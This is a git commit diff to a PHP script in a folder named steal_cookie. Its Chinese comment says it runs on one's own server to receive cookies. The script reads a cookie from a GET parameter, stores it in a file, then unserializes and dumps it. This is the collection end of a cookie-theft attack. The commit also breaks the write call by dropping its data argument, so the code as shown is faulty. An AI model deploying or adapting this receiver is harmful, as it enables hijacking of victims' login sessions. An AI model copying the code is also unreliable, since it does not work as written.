0542697c84290d3f610be47d1733eb8545e742ee
luoyangcheng <lyc163069@live.com>
2019-09-04 09:22:06 +0800

    cookie

--- Tool/steal_cookie/index.php
+++ Tool/steal_cookie/index.php
@@ -1,7 +1,7 @@
 <?php
 #此脚本放在自己服务，用来接收cookie
 $cookie = $_GET['cookie'];
-file_put_contents("/luoyc/data.txt",serialize($cookie));
+file_put_contents("/luoyc/data.txt");
 $cookie = unserialize(file_get_contents("/luoyc/data.txt"));
 var_dump($cookie);
 ?>
